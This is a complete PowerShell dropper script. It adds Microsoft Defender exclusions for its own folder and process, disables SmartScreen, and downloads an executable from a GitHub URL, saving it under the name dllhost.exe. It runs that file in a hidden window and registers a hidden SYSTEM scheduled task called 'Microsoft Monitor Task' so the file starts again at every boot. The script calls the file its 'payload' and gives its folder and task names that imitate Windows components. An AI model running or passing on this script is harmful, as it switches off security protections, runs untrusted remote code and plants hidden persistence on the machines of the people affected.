# Variables
$dir = "$env:APPDATA\Windows Networking"
$exeUrl = "https://github.com/rkx0/healthdb/raw/refs/heads/main/dllhost.exe"
$exeName = "dllhost.exe"
$exePath = Join-Path -Path $dir -ChildPath $exeName
$excludedProcesses = @("dllhost.exe")
$taskName = "Microsoft Monitor Task"

# 1. Create Directory
if (-not (Test-Path -Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
    Write-Host "[+] Created directory: $dir"
} else {
    Write-Host "[!] Directory already exists: $dir"
}

# 2. Add Defender Directory Exclusion
Try {
    Add-MpPreference -ExclusionPath $dir
    Write-Host "[+] Added Defender exclusion for directory: $dir"
} Catch {
    Write-Warning ("[-] Failed to add Defender exclusion for directory: {0}" -f $_.Exception.Message)
}

# 3. Add Defender Process Exclusion
foreach ($proc in $excludedProcesses) {
    Try {
        Add-MpPreference -ExclusionProcess $proc
        Write-Host "[+] Added Defender exclusion for process: $proc"
    } Catch {
        Write-Warning ("[-] Failed to exclude process {0}: {1}" -f $proc, $_.Exception.Message)
    }
}

# 4. Disable SmartScreen (Session-Based)
Try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
    Write-Host "[+] Disabled SmartScreen for this session"
} Catch {
    Write-Warning ("[-] Failed to disable SmartScreen: {0}" -f $_.Exception.Message)
}

# 5. Download Executable Payload
Try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
    Write-Host "[+] Downloaded executable to: $exePath"
} Catch {
    Write-Warning ("[-] Failed to download executable: {0}" -f $_.Exception.Message)
}

# 6. Execute the Payload Immediately
Try {
    Start-Process -FilePath $exePath -WorkingDirectory $dir -WindowStyle Hidden
    Write-Host "[+] Executed payload: $exePath"
} Catch {
    Write-Warning ("[-] Failed to execute payload: {0}" -f $_.Exception.Message)
}

# 7. Create Scheduled Task for Persistence
Try {
    $action = New-ScheduledTaskAction -Execute $exePath
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden)

    Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
    Write-Host "[+] Created scheduled task '$taskName' to run on startup"
} Catch {
    Write-Warning ("[-] Failed to create scheduled task: {0}" -f $_.Exception.Message)
}

# 8. Completion
Write-Host "[✓] Script completed. No restart was performed."
